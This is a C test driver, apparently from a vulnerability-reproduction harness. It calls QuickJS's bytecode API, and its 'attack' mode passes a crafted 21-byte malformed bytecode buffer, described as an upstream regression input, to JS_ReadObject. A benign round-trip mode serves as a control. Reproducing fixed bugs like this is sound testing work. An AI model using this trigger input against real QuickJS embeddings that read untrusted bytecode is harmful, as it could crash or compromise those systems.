/* frontier driver — calls pinned, unmodified QuickJS public bytecode API.
 * The 21-byte attack buffer is the upstream regression input from fix commit
 * 42526037cfc0b2a94a875c0de0f4bbeaf597a542 (tests/test_bjson.js).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "quickjs.h"

static const uint8_t poc[21] = {
	0x05, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x01, 0x00, 0x00, 0xff, 0xff, 0xff,
	0xff, 0x0f, 0x00, 0x00,
};

static void print_exception(JSContext *ctx)
{
	JSValue e = JS_GetException(ctx);
	const char *msg = JS_ToCString(ctx, e);
	printf("exception=%s\n", msg ? msg : "(null)");
	if (msg)
		JS_FreeCString(ctx, msg);
	JS_FreeValue(ctx, e);
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "attack";
	JSRuntime *rt;
	JSContext *ctx;
	JSValue obj, result;

	rt = JS_NewRuntime();
	ctx = JS_NewContext(rt);
	if (!ctx)
		return 2;

	if (!strcmp(mode, "attack")) {
		obj = JS_ReadObject(ctx, poc, sizeof(poc), JS_READ_OBJ_BYTECODE);
		printf("MODE=attack LEN=21 exception=%d\n", JS_IsException(obj));
		fflush(stdout);
		if (JS_IsException(obj))
			print_exception(ctx);
		JS_FreeValue(ctx, obj);
	} else if (!strcmp(mode, "safe-bytecode")) {
		size_t len = 0;
		uint8_t *buf;
		obj = JS_Eval(ctx, "1+1", 3, "<safe>", JS_EVAL_FLAG_COMPILE_ONLY);
		if (JS_IsException(obj)) {
			print_exception(ctx);
			return 1;
		}
		buf = JS_WriteObject(ctx, &len, obj, JS_WRITE_OBJ_BYTECODE);
		printf("MODE=safe-bytecode written=%d len=%zu\n", buf != NULL, len);
		fflush(stdout);
		if (!buf)
			return 1;
		JS_FreeValue(ctx, obj);
		obj = JS_ReadObject(ctx, buf, len, JS_READ_OBJ_BYTECODE);
		printf("read_exception=%d\n", JS_IsException(obj));
		fflush(stdout);
		if (!JS_IsException(obj)) {
			result = JS_EvalFunction(ctx, obj);
			/* JS_EvalFunction consumes obj; do not free it again. */
			obj = JS_UNDEFINED;
			int32_t val = 0;
			JS_ToInt32(ctx, &val, result);
			printf("value=%d\n", (int)val);
			fflush(stdout);
			JS_FreeValue(ctx, result);
		} else {
			print_exception(ctx);
		}
		js_free(ctx, buf);
	} else {
		fprintf(stderr, "unknown mode: %s\n", mode);
		return 2;
	}

	JS_FreeContext(ctx);
	JS_FreeRuntime(rt);
	return 0;
}
